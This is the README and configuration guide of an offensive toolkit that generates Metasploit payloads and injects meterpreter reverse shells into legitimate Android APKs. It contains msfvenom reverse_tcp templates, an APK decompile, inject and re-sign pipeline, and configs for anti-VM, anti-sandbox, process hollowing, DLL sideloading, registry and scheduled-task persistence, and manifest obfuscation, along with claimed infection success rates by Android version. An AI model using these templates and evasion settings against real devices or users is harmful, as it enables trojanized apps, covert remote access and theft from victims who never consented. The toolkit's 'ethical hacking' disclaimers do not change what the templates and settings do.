# 🎯 I See U Toolkit

[![Python Version](https://img.shields.io/badge/python-3.7+-blue.svg)](https://python.org)
[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-linux%20%7C%20windows%20%7C%20macos-lightgrey.svg)]()
[![Metasploit](https://img.shields.io/badge/metasploit-required-red.svg)]()

> **An advanced payload generation and injection toolkit for ethical hackers and penetration testers**

I See U Toolkit is a modern recreation of `mahadev_v1` with enhanced payload generation, APK injection capabilities, and multiple user interfaces. Built for stealth, speed, and simplicity across multiple platforms.

---

## 🚀 Features

### 🔥 **Core Capabilities**
- **Multi-Platform Payload Generation**: Windows, Linux, Android, macOS, iOS
- **Advanced APK Injection**: Support for Android 10-15 with stealth techniques
- **Multiple Interface Options**: CLI, XP-Style GUI, Modern GUI
- **Automatic Terminal Management**: Smart terminal detection and launching
- **Configuration Management**: Save/load presets for different environments

### 💉 **Payload Types**
- Traditional msfvenom payloads with custom encoding
- Download-and-execute "fetch" payloads  
- Multi-format generation (EXE, APK, ELF, BIN, RAW)
- Smali injection for Android applications
- Custom templates and encoding iterations

### 🎯 **APK Injection Features**
- **Android Version Compatibility**: Optimized for Android 10-15
- **Stealth Installation**: Inject into legitimate applications
- **Automatic Signing**: APK signing and zipaligning
- **Permission Patching**: Dynamic manifest modification
- **High Success Rate**: 95% success on Android 10-11, 65-80% on newer versions

---

## 📊 Interface Comparison

| Feature | CLI Version | XP-Style GUI | Modern GUI |
|---------|-------------|--------------|------------|
| **Ease of Use** | ⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
| **Performance** | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ |
| **Visual Appeal** | ⭐⭐ | ⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
| **System Resources** | Minimal | Low | Moderate |
| **Automation Support** | ✅ Full | ✅ Limited | ✅ Full |
| **Beginner Friendly** | ❌ | ✅ | ✅ |
| **Terminal Required** | ✅ | ❌ | ❌ |
| **Real-time Monitoring** | ✅ | ✅ | ✅ Advanced |

---

## 🛠 Installation Guide

### 📋 **Prerequisites**

#### **System Requirements**
```bash
- Python 3.7+
- Metasploit Framework
- Java Development Kit (OpenJDK 11+)
- Android Development Tools
```

#### **Supported Operating Systems**
- ✅ **Kali Linux** (Recommended)
- ✅ **Ubuntu/Debian** 
- ✅ **Fedora/CentOS/RHEL**
- ⚠️ **Windows** (via WSL)
- ⚠️ **macOS** (Limited support)

---

### 🐧 **Linux Installation (Recommended)**

#### **Kali Linux (One-liner)**
```bash
# Quick install for Kali Linux
curl -fsSL https://raw.githubusercontent.com/kishwordulal1234/i-see-u/main/install.sh | bash
```

#### **Manual Installation (All Linux Distros)**

**1. Update System & Install Dependencies**
```bash
# Debian/Ubuntu/Kali
sudo apt update && sudo apt upgrade -y
sudo apt install -y python3 python3-pip git metasploit-framework \
    apktool zipalign openjdk-11-jdk openjdk-11-jre-headless \
    python3-tk python3-dev build-essential

# Fedora/CentOS/RHEL
sudo dnf update -y
sudo dnf install -y python3 python3-pip git java-11-openjdk \
    java-11-openjdk-devel python3-tkinter
```

**2. Install Metasploit Framework (if not pre-installed)**
```bash
# For systems without Metasploit
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall
```

**3. Install Android Tools**
```bash
# Install Android SDK tools (if not available via package manager)
wget https://dl.google.com/android/repository/sdk-tools-linux-4333796.zip
unzip sdk-tools-linux-4333796.zip -d ~/android-sdk
export PATH=$PATH:~/android-sdk/tools/bin:~/android-sdk/platform-tools
echo 'export PATH=$PATH:~/android-sdk/tools/bin:~/android-sdk/platform-tools' >> ~/.bashrc
```

**4. Clone Repository & Setup**
```bash
git clone https://github.com/kishwordulal1234/i-see-u.git
cd i-see-u
chmod +x *.py
pip3 install -r requirements.txt
```

---

### 🪟 **Windows Installation (WSL)**

**1. Install WSL2 & Ubuntu**
```powershell
# Run in PowerShell as Administrator
wsl --install -d Ubuntu
wsl --set-default-version 2
```

**2. Setup Ubuntu Environment**
```bash
# Inside WSL Ubuntu
sudo apt update && sudo apt upgrade -y
sudo apt install -y python3 python3-pip git openjdk-11-jdk python3-tk

# Install Metasploit
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall && ./msfinstall
```

**3. Clone & Configure**
```bash
git clone https://github.com/kishwordulal1234/i-see-u.git
cd i-see-u
pip3 install -r requirements.txt
chmod +x *.py
```

---

### 🍎 **macOS Installation**

**1. Install Dependencies**
```bash
# Install Homebrew (if not installed)
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"

# Install requirements
brew install python@3.11 openjdk@11 git
brew install --cask metasploit

# Install Android tools
brew install --cask android-platform-tools
```

**2. Setup Project**
```bash
git clone https://github.com/kishwordulal1234/i-see-u.git
cd i-see-u
pip3 install -r requirements.txt
chmod +x *.py
```

---

## 🎮 **Usage Guide**

### 🖥️ **CLI Version**
```bash
# Basic CLI usage
python3 iseeu_toolkit.py

# With specific parameters
python3 iseeu_toolkit.py --lhost 192.168.1.100 --lport 4444 --platform windows
```

### 🎨 **XP-Style GUI (iseeu-xp-version.py)**
```bash
# Launch XP-style interface
python3 iseeu-xp-version.py

# Features:
# - Windows XP themed interface
# - Simple drag-and-drop APK injection
# - One-click payload generation
# - Built-in listener management
```

### ✨ **Modern GUI (iseeu-morden-gui.py)**
```bash
# Launch modern interface
python3 iseeu-morden-gui.py

# Features:
# - Modern dark/light theme
# - Advanced configuration options
# - Real-time progress monitoring
# - Integrated terminal output
# - Batch processing capabilities
```

---

## 📱 **Android Compatibility Matrix**

| Android Version | Standalone APK | Injected APK | Success Rate | Recommended Method |
|-----------------|---------------|--------------|--------------|-------------------|
| **Android 10-11** | ✅ Excellent | ✅ Excellent | 95% | Both methods work well |
| **Android 12-13** | ✅ Good | ⚠️ Moderate | 80% | Use injected APK method |
| **Android 14-15** | ❌ Poor | ✅ Good | 65% | **Injected APK only** |

### 🎯 **Best Practices for APK Injection**
```bash
# 1. Use legitimate applications as base
./iseeu-morden-gui.py --inject --base-apk legitimate_app.apk

# 2. Target older Android versions when possible
./iseeu-toolkit.py --android-target 11

# 3. Use custom templates for better evasion
./iseeu-toolkit.py --template custom_template.txt
```
# 🔧 I See U Toolkit - Configuration & Usage Guide

## 📁 Directory Structure

After installation, your I See U Toolkit directory should look like this:

```
i-see-u/
├── iseeu_toolkit.py          # Main CLI application
├── iseeu-morden-gui.py       # Modern GUI interface
├── iseeu-xp-version.py       # XP-style GUI interface
├── requirements.txt          # Python dependencies
├── requirements-dev.txt      # Development dependencies
├── install.sh               # Automated installer
├── README.md               # Main documentation
├── LICENSE                 # MIT license
├── configs/               # Configuration files
│   ├── default.json       # Default settings
│   ├── kali.json          # Kali Linux optimized
│   ├── windows.json       # Windows/WSL settings
│   ├── stealth.json       # High evasion settings
│   └── android_targets.json # Android-specific configs
├── payloads/              # Generated payloads output
├── logs/                  # Application logs
├── templates/             # Custom payload templates
├── docs/                  # Documentation
└── tests/                 # Unit tests (dev)
```

---

## ⚙️ Configuration Files

### 🎛️ **Default Configuration (configs/default.json)**

```json
{
  "network": {
    "lhost": "127.0.0.1",
    "lport": 4444,
    "auto_detect_ip": true,
    "preferred_interface": "eth0"
  },
  "payloads": {
    "encoder": "x86/shikata_ga_nai",
    "iterations": 3,
    "format": "exe",
    "platform": "windows",
    "architecture": "x64",
    "bad_chars": "\\x00\\x0a\\x0d"
  },
  "android": {
    "target_version": 11,
    "use_original_cert": false,
    "zipalign": true,
    "sign_apk": true
  },
  "output": {
    "directory": "./payloads",
    "filename_prefix": "iseeu_",
    "timestamp_suffix": true
  },
  "metasploit": {
    "auto_listener": true,
    "handler": "exploit/multi/handler",
    "workspace": "iseeu_default"
  },
  "gui": {
    "theme": "dark",
    "auto_save_config": true,
    "show_advanced_options": false
  },
  "logging": {
    "level": "INFO",
    "file": "./logs/iseeu.log",
    "max_size": "10MB",
    "backup_count": 5
  },
  "security": {
    "stealth_mode": false,
    "randomize_payload": true,
    "custom_templates": true
  }
}
```

### 🔥 **Kali Linux Optimized (configs/kali.json)**

```json
{
  "network": {
    "lhost": "auto",
    "lport": 4444,
    "auto_detect_ip": true,
    "preferred_interface": "eth0"
  },
  "payloads": {
    "encoder": "x64/xor_dynamic",
    "iterations": 5,
    "format": "elf",
    "platform": "linux",
    "architecture": "x64"
  },
  "android": {
    "target_version": 10,
    "use_original_cert": true,
    "zipalign": true,
    "sign_apk": true
  },
  "metasploit": {
    "auto_listener": true,
    "handler": "exploit/multi/handler",
    "workspace": "kali_pentest",
    "database": true
  },
  "logging": {
    "level": "DEBUG",
    "file": "./logs/kali_debug.log"
  },
  "security": {
    "stealth_mode": true,
    "randomize_payload": true,
    "custom_templates": true,
    "evasion_techniques": ["polymorphic", "encryption"]
  }
}
```

### 🥷 **Stealth Configuration (configs/stealth.json)**

```json
{
  "payloads": {
    "encoder": "x86/countdown",
    "iterations": 10,
    "custom_encoder": true,
    "polymorphic": true
  },
  "android": {
    "target_version": 10,
    "inject_method": "smali",
    "permission_minimal": true,
    "obfuscate_manifest": true
  },
  "evasion": {
    "anti_vm": true,
    "anti_debug": true,
    "sleep_timer": 30,
    "process_injection": true
  },
  "network": {
    "domain_fronting": false,
    "https_only": true,
    "user_agent_spoofing": true
  },
  "security": {
    "stealth_mode": true,
    "randomize_payload": true,
    "encrypt_strings": true,
    "strip_debug_info": true
  }
}
```

---

## 🚀 Usage Examples

### 🖥️ **CLI Version Usage**

#### **Basic Payload Generation**
```bash
# Windows reverse shell
python3 iseeu_toolkit.py --platform windows --lhost 192.168.1.100 --lport 4444

# Linux payload with custom encoder
python3 iseeu_toolkit.py --platform linux --encoder x64/xor --iterations 5

# Android APK with custom port
python3 iseeu_toolkit.py --platform android --lport 8080 --output myapp.apk
```

#### **APK Injection**
```bash
# Inject payload into legitimate APK
python3 iseeu_toolkit.py --inject --original-apk /path/to/app.apk --lhost 192.168.1.100

# Batch inject multiple APKs
python3 iseeu_toolkit.py --batch-inject --apk-directory /path/to/apks/
```

#### **Advanced Options**
```bash
# Use custom configuration
python3 iseeu_toolkit.py --config configs/stealth.json

# Generate multiple formats
python3 iseeu_toolkit.py --multi-format --formats exe,elf,apk

# Auto-start listener
python3 iseeu_toolkit.py --auto-listener --workspace pentest_2024
```

### 🎨 **Modern GUI Usage**

#### **Launch Modern GUI**
```bash
# Standard launch
python3 iseeu-morden-gui.py

# With specific theme
python3 iseeu-morden-gui.py --theme dark

# With custom config
python3 iseeu-morden-gui.py --config configs/kali.json
```

#### **GUI Features**
- **Real-time Progress**: Live updates during payload generation
- **Drag & Drop**: Drop APK files for instant injection
- **Batch Processing**: Queue multiple payloads
- **Integrated Terminal**: Built-in terminal for Metasploit
- **Theme Support**: Dark/Light/Auto themes
- **Configuration Manager**: Save and load presets

### 🔄 **XP-Style GUI Usage**

#### **Launch XP GUI**
```bash
# Basic launch
python3 iseeu-xp-version.py

# With retro theme
python3 iseeu-xp-version.py --theme xp-classic
```

#### **XP GUI Features**
- **Windows XP Aesthetics**: Nostalgic interface design
- **Simple Workflow**: One-click operations
- **Minimal Resource Usage**: Lightweight interface
- **Quick Access**: Fast payload generation

---

## 🌐 Environment Variables

### **Core Variables**
```bash
# Installation directory
export ISEEU_HOME="/home/user/i-see-u"

# Default network settings
export ISEEU_LHOST="192.168.1.100"
export ISEEU_LPORT="4444"

# Android SDK path (if custom)
export ANDROID_HOME="/opt/android-sdk"
export ANDROID_SDK_ROOT="/opt/android-sdk"

# Java settings
export JAVA_HOME="/usr/lib/jvm/java-11-openjdk-amd64"

# Metasploit database
export MSF_DATABASE_CONFIG="/usr/share/metasploit-framework/config/database.yml"
```

### **Advanced Variables**
```bash
# Logging level
export ISEEU_LOG_LEVEL="DEBUG"

# Custom templates directory
export ISEEU_TEMPLATES="/path/to/custom/templates"

# Proxy settings
export ISEEU_PROXY="http://proxy.example.com:8080"

# GUI theme preference
export ISEEU_THEME="dark"
```

---

## 🎯 Platform-Specific Configuration

### 🐧 **Linux Configuration**

#### **Kali Linux**
```bash
# Optimal settings for Kali
cp configs/kali.json configs/current.json

# Network interface detection
ip route | grep default | awk '{print $5}' > ~/.iseeu_interface

# Metasploit optimization
echo "db_connect -y /usr/share/metasploit-framework/config/database.yml" > ~/.msf4/msfconsole.rc
```

#### **Ubuntu/Debian**
```bash
# Install additional tools
sudo apt install -y sqlmap nikto dirb gobuster

# Set up aliases
echo "alias msfconsole='msfconsole -q'" >> ~/.bashrc
echo "alias iseeu-quick='python3 $ISEEU_HOME/iseeu_toolkit.py --config configs/default.json'" >> ~/.bashrc
```

### 🪟 **Windows/WSL Configuration**

#### **WSL Setup**
```bash
# Enable systemd (for WSL2)
echo '[boot]
systemd=true' | sudo tee -a /etc/wsl.conf

# Windows-specific network configuration
export ISEEU_LHOST=$(ip route show | grep -i default | awk '{ print $3}')

# X11 forwarding for GUI (if using VcXsrv)
export DISPLAY=$(cat /etc/resolv.conf | grep nameserver | awk '{print $2}'):0.0
export LIBGL_ALWAYS_INDIRECT=1
```

#### **Windows Native (Limited Support)**
```powershell
# PowerShell configuration
$env:ISEEU_HOME = "C:\tools\i-see-u"
$env:JAVA_HOME = "C:\Program Files\Java\jdk-11"
$env:ANDROID_HOME = "C:\Android\SDK"

# Add to PATH
$env:PATH += ";$env:ISEEU_HOME;$env:JAVA_HOME\bin;$env:ANDROID_HOME\tools"
```

### 🍎 **macOS Configuration**

```bash
# Homebrew paths
export JAVA_HOME=$(/usr/libexec/java_home -v 11)
export ANDROID_HOME="/usr/local/share/android-sdk"

# Network interface (usually en0)
export ISEEU_INTERFACE="en0"

# GUI support
export ISEEU_GUI_BACKEND="tkinter"
```

---

## 🔧 Advanced Configuration

### 🎭 **Custom Payload Templates**

#### **Create Custom Template (templates/custom_windows.txt)**
```bash
# Windows reverse shell with custom evasion
msfvenom -p windows/x64/meterpreter/reverse_tcp \
LHOST={{LHOST}} LPORT={{LPORT}} \
-e x64/xor_dynamic -i {{ITERATIONS}} \
-f exe -o {{OUTPUT}} \
--platform windows --arch x64 \
-b "{{BAD_CHARS}}" \
-k \
--smallest
```

#### **Android Injection Template (templates/android_stealth.txt)**
```bash
# Android payload with advanced evasion
msfvenom -p android/meterpreter/reverse_tcp \
LHOST={{LHOST}} LPORT={{LPORT}} \
-o {{TEMP_APK}} && \
apktool d {{ORIGINAL_APK}} -o {{TEMP_DIR}} && \
apktool d {{TEMP_APK}} -o {{PAYLOAD_DIR}} && \
# Custom smali injection logic here
{{CUSTOM_INJECTION_SCRIPT}} && \
apktool b {{TEMP_DIR}} -o {{OUTPUT}} && \
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 \
-keystore {{KEYSTORE}} {{OUTPUT}} {{KEY_ALIAS}} && \
zipalign -v 4 {{OUTPUT}} {{FINAL_OUTPUT}}
```

### 🔒 **Security Configurations**

#### **High Security Mode**
```json
{
  "security": {
    "stealth_mode": true,
    "encryption": {
      "enabled": true,
      "algorithm": "AES-256-GCM",
      "key_derivation": "PBKDF2"
    },
    "obfuscation": {
      "string_encryption": true,
      "control_flow": true,
      "dead_code_insertion": true
    },
    "anti_analysis": {
      "anti_vm": true,
      "anti_debug": true,
      "anti_sandbox": true,
      "packer": "upx"
    }
  }
}
```

#### **Evasion Techniques**
```json
{
  "evasion": {
    "techniques": [
      "domain_fronting",
      "dns_tunneling", 
      "process_hollowing",
      "dll_sideloading"
    ],
    "timing": {
      "sleep_before_execution": 60,
      "random_delays": true,
      "execution_window": "business_hours"
    },
    "persistence": {
      "registry_keys": true,
      "scheduled_tasks": true,
      "startup_folders": false
    }
  }
}
```

### 📱 **Android-Specific Advanced Config**

```json
{
  "android_advanced": {
    "target_versions": [10, 11, 12, 13, 14],
    "injection_methods": {
      "smali": {
        "enabled": true,
        "hook_points": ["onCreate", "onResume", "onStart"]
      },
      "native": {
        "enabled": false,
        "library_name": "libcustom.so"
      }
    },
    "manifest_modifications": {
      "permissions": {
        "add_minimal": true,
        "remove_suspicious": true,
        "custom_permissions": []
      },
      "activities": {
        "hide_launcher_icon": false,
        "background_execution": true
      }
    },
    "signing": {
      "custom_keystore": "./keys/custom.keystore",
      "key_alias": "custom_key",
      "key_password": "changeme",
      "store_password": "changeme"
    },
    "optimization": {
      "zipalign": true,
      "proguard": false,
      "resource_shrinking": true
    }
  }
}
```

---

## 🐛 Troubleshooting & Debug Mode

### 🔍 **Enable Debug Mode**
```bash
# CLI debug mode
python3 iseeu_toolkit.py --debug --verbose

# GUI debug mode
python3 iseeu-morden-gui.py --debug

# Environment debug
export ISEEU_LOG_LEVEL="DEBUG"
export ISEEU_VERBOSE="true"
```

### 📊 **System Diagnostics**
```bash
# Check system compatibility
python3 iseeu_toolkit.py --system-check

# Verify dependencies
python3 iseeu_toolkit.py --check-deps

# Network diagnostics
python3 iseeu_toolkit.py --network-test

# Generate diagnostic report
python3 iseeu_toolkit.py --diagnostic-report > iseeu_diagnostics.txt
```

### 🔧 **Common Fixes**

#### **Java Issues**
```bash
# Fix Java path
sudo update-alternatives --config java
export JAVA_HOME=$(readlink -f /usr/bin/javac | sed "s:/bin/javac::")

# Verify Java tools
keytool -help
jarsigner -help
```

#### **APKTool Problems**
```bash
# Reinstall apktool
sudo apt remove apktool
wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool
wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.7.0.jar
sudo cp apktool.jar /usr/local/bin/
sudo cp apktool /usr/local/bin/
sudo chmod +x /usr/local/bin/apktool

# Test apktool
apktool --version
```

#### **Metasploit Database Issues**
```bash
# Reset Metasploit database
sudo msfdb delete
sudo msfdb init

# Manual database setup
sudo systemctl start postgresql
sudo systemctl enable postgresql
sudo msfdb init
```

#### **GUI Issues**
```bash
# Install GUI dependencies
sudo apt install python3-tk python3-pil python3-pil.imagetk

# For WSL with GUI
sudo apt install xorg
export DISPLAY=$(cat /etc/resolv.conf | grep nameserver | awk '{print $2}'):0.0

# Test GUI
python3 -c "import tkinter; tkinter.Tk().mainloop()"
```

---

## 📈 Performance Optimization

### ⚡ **Speed Optimizations**
```json
{
  "performance": {
    "multi_threading": {
      "enabled": true,
      "max_workers": 4
    },
    "caching": {
      "payload_cache": true,
      "template_cache": true,
      "config_cache": true
    },
    "compilation": {
      "precompile_templates": true,
      "optimize_bytecode": true
    }
  }
}
```

### 💾 **Memory Management**
```json
{
  "memory": {
    "max_payload_size": "100MB",
    "cache_limit": "500MB",
    "gc_threshold": 0.8,
    "streaming_mode": true
  }
}
```

---

## 🚀 Automation & Scripting

### 🤖 **Batch Operations**
```bash
# Batch payload generation
python3 iseeu_toolkit.py --batch \
  --targets targets.txt \
  --config configs/stealth.json \
  --output-dir ./batch_payloads/

# Automated testing workflow
python3 iseeu_toolkit.py --workflow pentest \
  --target 192.168.1.0/24 \
  --ports 80,443,8080 \
  --auto-exploit
```

### 📋 **Configuration Management**
```bash
# Save current configuration
python3 iseeu_toolkit.py --save-config my_pentest.json

# Load and merge configurations  
python3 iseeu_toolkit.py --config base.json --merge additional.json

# Validate configuration
python3 iseeu_toolkit.py --validate-config my_config.json
```

---

## 📚 Integration Examples

### 🔗 **With Other Tools**

#### **Metasploit Integration**
```bash
# Auto-generate and load payload
python3 iseeu_toolkit.py --msf-integration \
  --workspace pentest_client \
  --auto-handler \
  --persistence

# Export to Metasploit resource script
python3 iseeu_toolkit.py --export-msf-rc output.rc
```

#### **Covenant Integration**
```bash
# Generate Covenant-compatible payloads
python3 iseeu_toolkit.py --covenant \
  --listener-profile default \
  --grunt-template custom
```

#### **Empire Integration**  
```bash
# Empire stager generation
python3 iseeu_toolkit.py --empire \
  --stager multi/launcher \
  --listener http
```

---

## 🔐 Security Best Practices

### 🛡️ **Operational Security**
1. **Never use on unauthorized systems**
2. **Rotate LHOST/LPORT regularly** 
3. **Use VPNs for remote testing**
4. **Clean up artifacts after testing**
5. **Document all activities**

### 📝 **Configuration Security**
```json
{
  "security_practices": {
    "config_encryption": true,
    "credential_management": "external_vault",
    "audit_logging": true,
    "access_controls": {
      "require_sudo": false,
      "user_whitelist": ["pentester", "security"]
    }
  }
}
```

---


### 📋 **When Reporting Issues**
Include:
- Operating system and version
- Python version (`python3 --version`)
- Full error message and stack trace
- Configuration file being used
- Steps to reproduce
- Expected vs actual behavior

---

<div align="center">

**🎯 Happy Ethical Hacking!**

*Remember: Always test responsibly and within legal boundaries.*

</div>
---

